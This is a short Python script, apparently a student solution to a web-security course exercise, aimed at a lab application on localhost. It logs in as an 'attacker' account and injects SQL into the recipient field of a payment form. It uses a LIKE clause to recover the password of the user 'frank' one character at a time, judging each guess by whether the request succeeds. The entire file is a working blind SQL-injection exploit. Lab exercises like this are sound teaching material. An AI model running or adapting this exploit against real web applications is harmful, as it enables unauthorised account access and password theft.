from requests import codes, Session
import string

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    # You may need to include CSRF token from Exercise 1.5 in the POST request below 
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "token": sess.cookies.get_dict()['session']
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    password = ""
    chars = string.ascii_lowercase
    while True:
        nextChar = None
        for char in chars:
            recipient = f"{username}' AND users.password LIKE '{password}{char}%"
            res = submit_pay_form(sess, recipient, 0)
            if res is False:
                continue
            nextChar = char
            break
        if nextChar is None:
            return password
        password += nextChar

def main():
    ans = sqli_attack("frank")
    print(ans)

if __name__ == "__main__":
    main()
